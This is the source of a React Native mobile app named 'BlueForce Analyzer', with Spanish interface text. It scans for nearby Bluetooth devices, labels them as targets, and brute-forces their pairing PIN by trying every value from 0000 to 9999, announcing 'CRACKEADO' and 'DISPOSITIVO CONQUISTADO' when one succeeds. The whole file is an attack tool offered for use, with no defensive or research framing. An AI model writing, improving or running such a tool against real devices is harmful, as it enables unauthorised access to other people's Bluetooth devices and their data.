import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [isBruting, setIsBruting] = useState(false);
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 100));
  };

  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      const granted = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
      ]);
      addLog("✅ Capa de permisos lista.");
    }
  };

  useEffect(() => {
    requestPermissions();
  }, []);

  const scanDevices = async () => {
    setDiscoveredDevices([]);
    addLog("🔍 Analizando el espectro Bluetooth...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices);
      addLog(`✅ Se detectaron ${devices.length} objetivos.`);
    } catch (err) {
      addLog(`⚠️ ERROR: ${err.message}`);
    }
  };

  const startAttack = async (device) => {
    setSelectedDevice(device);
    setIsBruting(true);
    addLog(`🚀 ATAQUE INICIADO contra ${device.name || 'ANÓNIMO'} (${device.address})`);

    for (let i = 0; i <= 9999; i++) {
      if (!isBruting) break;
      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      
      try {
        const connected = await RNBluetoothClassic.pairDevice(device.address, { pin });
        if (connected) {
          addLog(`🎯 CRACKEADO! PIN: ${pin}`);
          setIsBruting(false);
          Alert.alert("¡DISPOSITIVO CONQUISTADO!", `PIN: ${pin}`);
          break;
        }
      } catch (err) {
        if (i % 10 === 0) addLog(`... Probando rango ${i}-${i+9}`);
        await new Promise(r => setTimeout(r, 800));
      }
    }
    setIsBruting(false);
  };

  const renderDevice = ({ item }) => (
    <View style={styles.deviceCard}>
      <View style={styles.deviceInfo}>
        <Text style={styles.deviceName}>{item.name || "DISPOSITIVO ANÓNIMO"}</Text>
        <Text style={styles.deviceMac}>{item.address}</Text>
        <Text style={styles.deviceExtra}>Fuerza de Señal: {item.rssi || '?' } dBm</Text>
      </View>
      <TouchableOpacity 
        style={styles.attackBtn} 
        onPress={() => startAttack(item)}
        disabled={isBruting}
      >
        <Text style={styles.attackBtnText}>SELECCIONAR</Text>
      </TouchableOpacity>
    </View>
  );

  return (
    <View style={styles.container}>
      <Text style={styles.header}>BlueForce Analyzer</Text>
      
      <View style={styles.statsPanel}>
        <Text style={styles.statText}>OBJETIVO: {selectedDevice ? selectedDevice.address : "NINGUNO"}</Text>
        <Text style={styles.pinText}>PIN ACTUAL: {currentPin}</Text>
      </View>

      <TouchableOpacity style={styles.scanBtn} onPress={scanDevices} disabled={isBruting}>
        <Text style={styles.scanBtnText}>ESCANEAR ENTORNO</Text>
      </TouchableOpacity>

      <FlatList
        data={discoveredDevices}
        keyExtractor={(item) => item.address}
        renderItem={renderDevice}
        ListEmptyComponent={<Text style={styles.emptyText}>Pulsa Escanear para buscar señales...</Text>}
        style={styles.list}
      />

      <ScrollView style={styles.logBox}>
        {logs.map((log, index) => <Text key={index} style={styles.logLine}>{log}</Text>)}
      </ScrollView>

      {isBruting && (
        <TouchableOpacity style={styles.stopBtn} onPress={() => setIsBruting(false)}>
          <Text style={styles.stopBtnText}>DETENER ATAQUE</Text>
        </TouchableOpacity>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#05070a', padding: 20, paddingTop: 50 },
  header: { fontSize: 28, fontWeight: '800', color: '#00f2ff', textAlign: 'center', marginBottom: 20 },
  statsPanel: { backgroundColor: '#10141d', padding: 15, borderRadius: 15, marginBottom: 15, borderLeftWidth: 4, borderLeftColor: '#00f2ff' },
  statText: { color: '#fff', fontSize: 12, opacity: 0.7 },
  pinText: { color: '#00f2ff', fontSize: 24, fontWeight: 'bold' },
  scanBtn: { backgroundColor: '#fff', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 20 },
  scanBtnText: { fontWeight: 'bold', fontSize: 16 },
  list: { flex: 1, marginBottom: 20 },
  deviceCard: { backgroundColor: '#1a1f2b', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
  deviceName: { color: '#fff', fontWeight: 'bold', fontSize: 16 },
  deviceMac: { color: '#00f2ff', fontSize: 12, fontFamily: 'monospace' },
  deviceExtra: { color: '#888', fontSize: 10 },
  attackBtn: { backgroundColor: '#00f2ff', padding: 10, borderRadius: 8 },
  attackBtnText: { fontSize: 12, fontWeight: 'bold' },
  logBox: { height: 120, backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 10, padding: 10 },
  logLine: { color: '#666', fontSize: 10, marginBottom: 2 },
  emptyText: { color: '#444', textAlign: 'center', marginTop: 50 },
  stopBtn: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginTop: 10 },
  stopBtnText: { color: '#fff', fontWeight: 'bold' }
});
